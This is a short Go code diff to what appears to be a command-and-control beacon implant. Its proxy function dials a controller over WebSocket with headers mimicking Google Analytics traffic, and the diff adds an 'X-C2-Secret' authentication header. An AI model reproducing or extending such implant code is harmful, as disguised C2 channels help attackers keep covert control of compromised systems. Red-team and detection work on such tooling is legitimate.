@@ -314,6 +314,9 @@ func (b *Beacon) RunProxy(wsURL string) {
 	hdrs := http.Header{}
 	hdrs.Set("User-Agent", gaUserAgent)
 	hdrs.Set("Referer", gaReferer)
+	if b.secret != "" {
+		hdrs.Set("X-C2-Secret", b.secret)
+	}
 
 	ws, _, err := dialer.Dial(wsURL, hdrs)
 	if err != nil {
